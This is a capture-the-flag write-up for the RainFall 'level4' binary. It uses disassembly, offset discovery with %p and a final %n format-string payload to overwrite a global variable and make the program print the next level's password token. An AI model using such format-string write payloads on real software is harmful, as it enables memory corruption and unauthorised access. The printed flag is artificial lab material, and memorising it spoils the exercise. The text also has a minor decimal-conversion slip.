level4 exploit

   ```bash
   ssh level4@<ip>
    System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
   level4@RainFall:~$ 
   ```

the p function print the param_1 which is the local_20c a buffer of 520 byt 

wee need to get to the m variable globale variable which must be 16930116 to get the seystem executed 

```bash
### GDB Disassembly with Comments for level4 ###

# Function: main
0x080484a7 <+0>:    push   %ebp                  # Prologue
0x080484a8 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x080484aa <+3>:    and    $0xfffffff0,%esp      # Align stack to 16 bytes
0x080484ad <+6>:    call   0x8048457 <n>         # Call function n()
0x080484b2 <+11>:   leave                         # Epilogue
0x080484b3 <+12>:   ret                           # Return from main

# Function: n
0x08048457 <+0>:    push   %ebp                  # Prologue
0x08048458 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x0804845a <+3>:    sub    $0x218,%esp           # Allocate 536 bytes on stack for buffer
0x08048460 <+9>:    mov    0x8049804,%eax        # Load stdin (FILE*) into eax
0x08048465 <+14>:   mov    %eax,0x8(%esp)        # 3rd arg of fgets: FILE*
0x08048469 <+18>:   movl   $0x200,0x4(%esp)       # 2nd arg of fgets: size 512
0x08048471 <+26>:   lea    -0x208(%ebp),%eax      # Buffer address
0x08048477 <+32>:   mov    %eax,(%esp)            # 1st arg of fgets: buffer
0x0804847a <+35>:   call   0x8048350 <fgets@plt>  # Call fgets(buf, 512, stdin)

0x0804847f <+40>:   lea    -0x208(%ebp),%eax      # Load buffer again
0x08048485 <+46>:   mov    %eax,(%esp)            # Push buffer as arg
0x08048488 <+49>:   call   0x8048444 <p>          # Call p(buffer)

0x0804848d <+54>:   mov    0x8049810,%eax        # Load global var m into eax
0x08048492 <+59>:   cmp    $0x1025544,%eax       # Check if m == 0x1025544
0x08048497 <+64>:   jne    0x80484a5 <n+78>       # If not equal, skip next part
0x08048499 <+66>:   movl   $0x8048590,(%esp)      # Push "/bin/cat .../.pass" string
0x080484a0 <+73>:   call   0x8048360 <system@plt> # system("/bin/cat ...")
0x080484a5 <+78>:   leave                         # Epilogue
0x080484a6 <+79>:   ret                           # Return from n

# Function: p
0x08048444 <+0>:    push   %ebp                  # Prologue
0x08048445 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x08048447 <+3>:    sub    $0x18,%esp            # Allocate 24 bytes on stack
0x0804844a <+6>:    mov    0x8(%ebp),%eax         # Load argument (char *str)
0x0804844d <+9>:    mov    %eax,(%esp)            # Push str to stack
0x08048450 <+12>:   call   0x8048340 <printf@plt> # printf(str)
0x08048455 <+17>:   leave                         # Epilogue
0x08048456 <+18>:   ret                           # Return from p
```

we are at **Format string attack** vulnerability we need to manipulate the printf to write to the m variable  "m == 0x1025544" // 16930112 in decimal 

what we can use :

| **Specifier** | **Meaning**                  | **Use in Exploits**                    |
|:----------|:-------------------------|:-----------------------------------|
| `%d`        | Signed decimal integer   | Leak stack/heap values             |
| `%u`        | Unsigned decimal integer | Leak memory addresses              |
| `%x`        | Hexadecimal (lowercase)  | Leak memory (common in exploits)   |
| `%X`        | Hexadecimal (uppercase)  | Same as `%x`                         |
| `%p`        | Pointer address          | Leak absolute addresses (critical) |
| `%s`        | String                   | Crash if invalid pointer (DoS)     |
| `%c`        | Character                | Rarely useful in exploits          |
| `%f`        | Floating-point           | Rarely useful                      |

here is link to find out more

<https://owasp.org/www-community/attacks/Format_string_attack>

lets test for format string vulnerability and define the offset:

```bash
python -c 'print("AAAA" + "%p "*20)' | ./level4
AAAA0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
```

the 0x41414141 located at the 12th position lets conferm it :

```bash
level4@RainFall:~$ python -c 'print("AAAA" + "%12$p")' | ./level4
AAAA0x41414141
```

lets use `%n` format specifier to write the number of bytes 

Craft:

```bash
python -c 'print("\x10\x98\x04\x08" + "%16930112x%12$n")' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

here is the cat .pass trigger 